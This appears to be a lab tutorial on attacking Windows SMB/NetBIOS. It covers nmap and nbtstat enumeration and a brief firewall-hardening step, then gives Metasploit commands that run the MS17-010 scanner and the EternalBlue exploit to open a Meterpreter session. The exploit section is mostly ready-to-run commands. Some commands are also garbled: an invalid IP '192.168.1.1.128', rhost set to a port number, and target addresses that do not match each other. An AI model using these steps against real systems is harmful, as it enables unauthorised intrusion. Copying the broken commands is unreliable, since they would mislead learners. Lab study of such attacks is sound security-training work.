# NetBIOS/SMB Penetration on Windows

---

### Scanning open port for NetBIOS Enumeration

> You will scan the target network for open TCP and UDP ports and protocol.

```bash
nmap -sT -sU 192.168.1.128
```

#### Ports That Open

### 

## You Can Enumerate The Network Using Nbtstat

```bash
nbtstat -a 192.168.1.128
```

### Hardening The Targeted System

#### Open Windows Firewall Settings

#### Filtering Ports 135-139

> 1. Click on Inbound Rules
> 2. Click NEW RULE
> 3. Click Button for port to create new rule \(TCP or UDP\)
> 4. Click Next
> 5. Click UDP port to apply rule
> 6. Click next
> 7. Chose Block Connection

#### Scan Target System Again

```
nbtstat -a 192.168.1.128
```

#### 

## Exploit Target System Using Metasploit

```
msf > search smb_ms17_010

msf > Use auxiliary/scanner/smb/smb_ms17_010

msf auxiliary(smb_ms17_010) > set rhost 192.168.1.28

msf auxiliary(smb_ms17_010) > set port 445

msf auxiliary(smb_ms17_010) > exploit
```

### Exploit Results

> From the results you will see that the system is vulnerable to the scan
>
> * **rhost** is the target system IP address
> * **lhost** is your system IP address

```
search smb_ms17_010_eternalblue

use exploit/windows/smb/ms17_010_eternalblue

msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.1.128

msf exploit(ms17_010_eternalblue) > set rhost 445

msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.115

msf exploit(ms17_010_eternalblue) > exploit
```

#### Meterpreter Session

> Meterpreter session of targeted system will show information regarding the system





